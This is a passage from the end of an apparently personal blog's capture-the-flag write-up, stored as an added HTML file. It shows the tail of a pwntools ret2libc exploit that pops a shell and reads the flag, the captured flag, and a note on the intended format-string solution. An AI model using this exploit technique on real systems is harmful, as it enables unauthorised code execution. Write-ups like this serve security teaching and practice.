+</span></span><span style="display:flex;"><span>    RET <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000f410b</span>
+</span></span><span style="display:flex;"><span>    BINSH <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d8678</span>
+</span></span><span style="display:flex;"><span>    ret2libc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">28</span> <span style="color:#f92672">+</span> flat(POP_RDI, BINSH, libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(ret2libc)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;ls&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p><strong>FLAG</strong>: <code>HTB{Fm7_S7r1Ng_T0_0n3_G4dG37_1S_Th3_1337_W4y}</code></p>
+<h3 id="intended-solve">Intended solve<a hidden class="anchor" aria-hidden="true" href="#intended-solve">#</a></h3>
+<p>As the flag suggests this was not the intended solution.
+From what I understood after the end of the CTF the intended way of exploiting the overflow was to mess with the <code>printf</code> used in the <code>main</code> function by making <code>r12</code> point to some user inputted format string payload.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
